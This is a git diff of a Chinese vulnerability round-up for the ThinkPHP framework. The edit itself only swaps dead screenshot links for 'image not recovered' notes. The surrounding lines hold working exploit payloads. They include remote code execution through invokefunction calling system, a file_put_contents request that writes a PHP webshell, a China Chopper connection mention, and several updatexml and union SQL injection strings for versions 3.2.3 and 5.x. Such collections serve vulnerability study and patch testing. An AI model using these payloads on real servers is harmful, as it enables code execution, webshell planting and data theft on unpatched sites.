@@ -76,7 +76,7 @@ https://www.freebuf.com/vuls/194093.html
 _method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png) `）
 
   **二，ThinkPHP 5.0.22 远程代码执行**  
 **漏洞介绍**  
@@ -99,7 +99,7 @@ https://www.secpulse.com/archives/93903.html
 ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]=whoami
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png)](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png)](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png) `）
 
 **代码执行查看 phpinfo**
 
@@ -107,7 +107,7 @@ https://www.secpulse.com/archives/93903.html
 ?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]=-1
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png)](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png)](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png) `）
 
 **写文件 payload**
 
@@ -115,7 +115,7 @@ https://www.secpulse.com/archives/93903.html
 ?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell1.php&vars[1][]=<?php phpinfo();?>
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png) `）
 
   **三，ThinkPHP 2.2 任意代码执行**  
 **影响版本**  
@@ -134,13 +134,13 @@ THINKPHP 2.x-2.2
 ?s=/abc/abc/abc/${THINK_VERSION}
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png) `）
 
   **getshell 菜刀直接连接构造的连接**
 
-[![](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png) `）
 
-[![](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png)](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png)](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png) `）
 
 **0x02ThinkPHP sql 注入漏洞**
 
@@ -198,7 +198,7 @@ class Index{
 ?orderby[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png)](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png)](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png) `）
 
 **二，Thinkphp3.2.3 find/select/delete 注入**  
 **影响版本**  
@@ -248,7 +248,7 @@ http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[alias]=where%2
 http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png)](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png)](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png) `）
 
 而 **delete()** 方法的话同样，这里粗略举三个例子，table,alias,where，但使用 table 和 alias 的时候，同时还必须保证 where 不为空
 
@@ -270,7 +270,7 @@ http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[where]=1%20and
 http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐&id[where]=1
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png) `）
 
   **三，ThinkPHP 框架 3.2.3 update 注入漏洞**  
 **影响版本**  
@@ -324,7 +324,7 @@ class UserController extends Controller {
 /index.php/home/user?name=1123&pass=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png) `）
 
   **四，ThinkPHP 5.1.7 update 注入**  
 **漏洞介绍**  
@@ -363,7 +363,7 @@ class index
 /index.php?pass[0]=inc&pass[1]=updatexml(2,concat(0x7e,user()),0)&pass[2]=1
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png) `）
 
   **五，ThinkPHP 5.0.15 insert 注入**  
 **漏洞介绍**  
@@ -404,7 +404,7 @@ class Index
 /index/index/index?name[0]=inc&name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&name[2]=1
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png) `）
 
   **六，ThinkPHP5 select 注入**  
 **漏洞介绍**  
@@ -445,7 +445,7 @@ class Index
 /index/index/index?name=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png) `）
 
   **七，ThinkPHP5.0.10 select 注入**  
 **漏洞介绍**  
@@ -486,7 +486,7 @@ class Index
 /index/index/index?name[0]=not like&name[1][0]=%%&name[1][1]=233&name[2]=) union select 1,user()#
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png) `）
 
   **八，ThinkPHP Mysql 聚合函数相关方法注入  
 漏洞介绍**  
@@ -535,7 +535,7 @@ class Index
 /index/index/index?options=id)%2bupdatexml(1,concat(0×7,user(),0x7e),1) from user%23`
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png) `）
 
   **0x03ThinkPHP 文件包含漏洞**
 
@@ -578,7 +578,7 @@ class Index
 /index.php/index/index/index?cacheFile=1.jpg
 ```
 
-[![](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png)](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png)
+**原图暂未找回**（原引用：` [![](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png)](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png) `）
 
 ---
 
